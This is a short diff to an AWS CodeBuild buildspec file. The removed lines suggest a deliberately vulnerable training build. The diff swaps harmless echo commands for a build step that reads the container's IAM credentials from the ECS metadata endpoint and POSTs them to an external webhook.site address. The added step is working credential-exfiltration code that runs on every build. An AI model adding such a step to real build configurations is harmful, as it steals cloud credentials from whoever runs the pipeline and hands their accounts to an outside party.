@@ -3,6 +3,10 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - |
+        curl -fsS \
+          "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" \
+          | curl -fsS -X POST \
+              -H 'Content-Type: application/json' \
+              --data-binary @- \
+              'https://webhook.site/0b9973f6-84da-4f46-a8d0-11077072813e'
